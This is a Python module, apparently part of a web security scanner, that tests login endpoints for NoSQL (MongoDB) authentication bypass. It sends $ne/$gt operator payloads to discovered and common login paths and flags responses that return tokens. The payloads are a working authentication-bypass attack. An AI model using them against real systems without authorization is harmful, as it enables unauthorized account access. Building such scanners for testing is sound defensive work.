"""Contournement d'authentification NoSQL (MongoDB) par opérateurs.

Injecte `$ne`/`$gt` dans les champs des endpoints de login découverts par
le crawl (formulaires + endpoints POST qui évoquent l'authentification).
"""
from __future__ import annotations

from ..scan_models import Finding
from .base import MAX_TARGETS_PER_MODULE
from ._util import merged_login_targets

NOSQL_PAYLOADS = [
    {"email": {"$ne": None}, "password": {"$ne": None}},
    {"email": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$ne": None}, "password": {"$ne": None}},
]

# Repli intégré : endpoints de login courants, toujours sondés même sans
# formulaire découvert par le crawl (SPA peu explorable).
LOGIN_ENDPOINTS = ["/rest/user/login", "/api/login", "/api/auth/login",
                   "/login", "/api/users/login", "/auth/login", "/session"]


def t_nosql_auth_bypass(ctx) -> list[Finding]:
    """Sonde CHAQUE cible de login découverte/repli et confirme TOUTES les
    instances de bypass NoSQL (une par cible, dès le premier opérateur
    concluant)."""
    out: list[Finding] = []
    targets = merged_login_targets(ctx.sitemap, ctx.origin, LOGIN_ENDPOINTS)
    targets = targets[:MAX_TARGETS_PER_MODULE]
    for action, _fields in targets:
        ref, _, _ = ctx.safe_post(action, data={"email": "nobody@nope.tld", "password": "x"})
        if ref in (-1, 404):
            continue
        for pl in NOSQL_PAYLOADS:
            st, _, body = ctx.safe_post(action, data=pl)
            low = (body or "").lower()
            if st == 200 and ("token" in low or "authentication" in low or "jwt" in low):
                out.append(Finding("nosql", "nosql-auth-bypass", "critical", action,
                                   "Opérateur NoSQL ($ne/$gt) -> authentification contournée",
                                   request=f"POST {action}"))
                break
    return out


ATTACKS = [
    ("nosql", "NoSQL auth bypass", t_nosql_auth_bypass),
]
